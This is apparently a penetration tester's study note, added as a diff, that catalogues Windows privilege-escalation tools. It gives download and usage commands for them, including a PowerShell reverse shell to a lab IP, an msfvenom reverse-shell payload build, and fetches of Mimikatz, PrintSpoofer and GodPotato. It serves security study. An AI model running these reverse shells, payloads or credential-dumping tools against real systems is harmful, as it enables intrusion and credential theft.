@@ -1,0 +1,347 @@
+                     ______________________________
+
+                      WINDOWS PRIVILEGE ESCALATION
+                              Useful Tools
+
+                                Hexdump
+                     ______________________________
+
+
+Table of Contents
+_________________
+
+1. Why do we use Tools?
+2. Useful Tools (in Windows)
+.. 1. certutil
+.. 2. Invoke-WebRequest
+.. 3. netcat
+.. 4. Invoke-PowerShellTcp
+.. 5. msfvenom
+.. 6. mingw32
+.. 7. PrintSpoofer
+.. 8. GodPotato
+.. 9. winPEAS
+.. 10. PowerUp
+.. 11. PrivescCheck
+.. 12. BeRoot
+.. 13. Mimikatz
+.. 14. Impacket
+.. 15. Responder
+.. 16. Chisel
+.. 17. Hashcat + John
+.. 18. Crackmapexec
+
+
+1 Why do we use Tools?
+======================
+
+  `Tools' are an integral part of Computer Science, and therefore of
+  Cybersecurity. We use tools to automate tasks that would otherwise
+  take `time' and `effort', which are scarce resources.
+
+  In my opinion, a tool is useful if and only if:
+
+  1. It precisely defines the context in which it works properly.
+  2. It is simple to use relative to the functions it offers.
+  3. It can be easily integrated into automation workflows.
+  4. It is clear and coincise.
+  5. It is as minimal as possible.
+  6. It can be easily understood and modified.
+
+  Regardless of how many tools you use, always try to understand what is
+  the action that the tool is doing, to see how you yourself would
+  implement such action.
+
+  Tools are useful, but the best tool remains the mind.
+
+
+2 Useful Tools (in Windows)
+===========================
+
+2.1 certutil
+~~~~~~~~~~~~
+
+  utility to transfer files in windows.
+
+  ,----
+  | certutil -urlcache -split -f <URL> <OUTPUT-FILE>
+  | certutil -urlcache -split -f https://leonardotamiano.xyz/note.txt note.txt
+  `----
+
+
+2.2 Invoke-WebRequest
+~~~~~~~~~~~~~~~~~~~~~
+
+  powershell utility to transfer files.
+
+  ,----
+  | Invoke-WebRequest -uri <URL> -Outfile <OUTPUT-FILE>
+  | iwr -uri <URL> -Outfile <OUTPUT-FILE>
+  | iwr -uri https://leonardotamiano.xyz/note.txt -Outfile note.txt
+  `----
+
+
+2.3 netcat
+~~~~~~~~~~
+
+  utility to manage TCP connections.  Can be used for reverse shells.
+
+  ,----
+  | iwr -uri https://raw.githubusercontent.com/int0x33/nc.exe/master/nc64.exe -Outfile netcat64.exe
+  `----
+
+
+2.4 Invoke-PowerShellTcp
+~~~~~~~~~~~~~~~~~~~~~~~~
+
+  Reverse shell in powershell
+
+  ,----
+  | iwr -uri https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1  -Outfile Invoke-PowerShellTcp.ps1
+  `----
+
+  ,----
+  | . .\Invoke-PowerShellTcp
+  | Invoke-PowerShellTcp -Reverse -IPAddress 192.168.122.1 -Port 4321
+  `----
+
+
+2.5 msfvenom
+~~~~~~~~~~~~
+
+  Used to generate various malicious payloads.
+
+  ,----
+  | msfvenom -p windows/shell_reverse_tcp LHOST=192.168.122.1 LPORT=7777 -f exe -o malicious.exe
+  `----
+
+
+2.6 mingw32
+~~~~~~~~~~~
+
+  Cross compiler `linux->windows'.
+
+  ,----
+  | sudo pacman -S mingw-w64-gcc
+  `----
+
+  ,----
+  | #include <stdio.h>
+  | 
+  | int main(void) {
+  |   printf("Hello World!\n");
+  |   return 0;
+  | }
+  `----
+
+  ,----
+  | x86_64-w64-mingw32-g++ hello.c -static -o hello
+  `----
+
+
+2.7 PrintSpoofer
+~~~~~~~~~~~~~~~~
+
+  Tool used to exploit the `SeImpersonatePrivilege'.
+
+  ,----
+  | iwr -uri "https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer32.exe" -Outfile PrintSpoofer32.exe
+  | iwr -uri "https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe" -Outfile PrintSpoofer64.exe
+  `----
+
+
+2.8 GodPotato
+~~~~~~~~~~~~~
+
+  Tool used to exploit the `SeImpersonatePrivilege'.
+
+  ,----
+  | iwr -uri "https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET2.exe" -Outfile GodPotato-NET2.exe
+  | iwr -uri "https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET35.exe" -Outfile GodPotato-NET35.exe
+  | iwr -uri "https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe" -Outfile GodPotato-NET4.exe
+  `----
+
+
+2.9 winPEAS
+~~~~~~~~~~~
+
+  Windows Privilege Escalation Awesome Script (.exe)
+  <https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe>
+
+  WinPEAS is a script that search for possible paths to escalate
+  privileges on Windows hosts.
+
+  Download
+  ,----
+  | iwr -uri https://github.com/peass-ng/PEASS-ng/releases/download/20241205-c8c0c3e5/winPEASx64.exe  -Outfile winPEASx64.exe
+  `----
+
+  Checks:
+
+  - System Information
+  - Users Information
+  - Processes Information
+  - Services Information
+  - Applications Information
+  - Network Information
+  - Cloud Metadata Enumeration
+  - Windows Credentials
+  - Browser Information
+  - Interesting Files and registry
+  - Events Information
+
+  Log output
+  ,----
+  | .\winPEASx64.exe log
+  `----
+
+  Options
+  ,----
+  | domain               Enumerate domain information
+  | systeminfo           Search system information
+  | eventsinfo           Display interesting events information
+  | userinfo             Search user information
+  | processinfo          Search processes information
+  | servicesinfo         Search services information
+  | applicationsinfo     Search installed applications information
+  | networkinfo          Search network information
+  | cloudinfo            Enumerate cloud information
+  | windowscreds         Search windows credentials
+  | browserinfo          Search browser information
+  | filesinfo            Search generic files that can contains credentials
+  | fileanalysis         [NOT RUN BY DEFAULT] Search specific files that can contains credentials and for regexes inside files. Might take several minutes.
+  | all                  Run all checks the previous check including fileanalysis.
+  `----
+
+
+2.10 PowerUp
+~~~~~~~~~~~~
+
+  PowerUp aims to be a clearinghouse of common Windows privilege
+  escalation vectors that rely on misconfigurations.
+  <https://powersploit.readthedocs.io/en/latest/Privesc/>
+
+  Post-exploitation script designed for privilege escalation in Windows
+  environments to identify and exploit privilege escalation
+  vulnerabilities on compromised Windows systems.
+
+  Download
+  ,----
+  | iwr -uri https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/refs/heads/master/Privesc/PowerUp.ps1 -Outfile PowerUp.ps1
+  `----
+
+  Loading `PowerUp.ps1'
+  ,----
+  | Import-Module PowerUp.ps1
+  | . .\PowerUp.ps1
+  `----
+
+  Perform all checks
+  ,----
+  | Invoke-PrivescAudit -HTMLReport
+  `----
+
+
+2.11 PrivescCheck
+~~~~~~~~~~~~~~~~~
+
+  This script aims to identify Local Privilege Escalation (LPE)
+  vulnerabilities that are usually due to Windows configuration issues,
+  or bad practices. It can also gather useful information for some
+  exploitation and post-exploitation tasks.
+  <https://github.com/itm4n/PrivescCheck>
+
+  Download
+  ,----
+  | iwr -uri "https://raw.githubusercontent.com/itm4n/PrivescCheck/refs/heads/master/release/PrivescCheck.ps1"  -Outfile PrivescCheck.ps1
+  `----
+
+  Basic checks
+  ,----
+  | powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
+  `----
+
+  Extended checks
+  ,----
+  | powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT,HTML"
+  `----
+
+
+2.12 BeRoot
+~~~~~~~~~~~
+
+  BeRoot Project is a post exploitation tool to check common
+  misconfigurations to find a way to escalate our privilege.
+  <https://github.com/AlessandroZ/BeRoot?tab=readme-ov-file>
+
+  This tool does not realize any exploitation. It mains goal is not to
+  realize a configuration assessment of the host (listing all services,
+  all processes, all network connection, etc.) but to print only
+  information that have been found as potential way to escalate our
+  privilege.
+
+  Download
+  ,----
+  | iwr -uri "https://github.com/AlessandroZ/BeRoot/releases/download/1.0.1/beRoot.zip" -Outfile beRoot.zip
+  `----
+
+
+2.13 Mimikatz
+~~~~~~~~~~~~~
+
+  Dump NTLM hashes and many other powerful things.
+
+  ,----
+  | iwr -uri "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip" -Outfile mimikatz_trunk.zip
+  `----
+
+
+2.14 Impacket
+~~~~~~~~~~~~~
+
+  Collection of Python classes for working with Windows related network
+  protocols.  <https://github.com/fortra/impacket>
+
+  ,----
+  | python3 -m venv venv
+  | . venv/bin/activate
+  | 
+  | pip3 install impacket
+  | pip install netifaces
+  `----
+
+
+2.15 Responder
+~~~~~~~~~~~~~~
+
+  Responder is a LLMNR, NBT-NS and MDNS poisoner, with built-in
+  HTTP/SMB/MSSQL/FTP/LDAP rogue authentication server supporting
+  NTLMv1/NTLMv2/LMv2, Extended Security NTLMSSP and Basic HTTP
+  authentication
+
+  ,----
+  | git clone https://github.com/lgandx/Responder
+  `----
+
+
+2.16 Chisel
+~~~~~~~~~~~
+
+  TCP/UDP tunnel over HTTP.  Tool to pivot inside internal networks
+  points
+
+  <https://github.com/jpillora/chisel>
+
+
+2.17 Hashcat + John
+~~~~~~~~~~~~~~~~~~~
+
+  Tools for cracking hashes <https://www.openwall.com/john/>
+  <https://hashcat.net/hashcat/>
+
+
+2.18 Crackmapexec
+~~~~~~~~~~~~~~~~~
+
+  A swiss army knife for pentesting networks
+  <https://github.com/byt3bl33d3r/CrackMapExec>
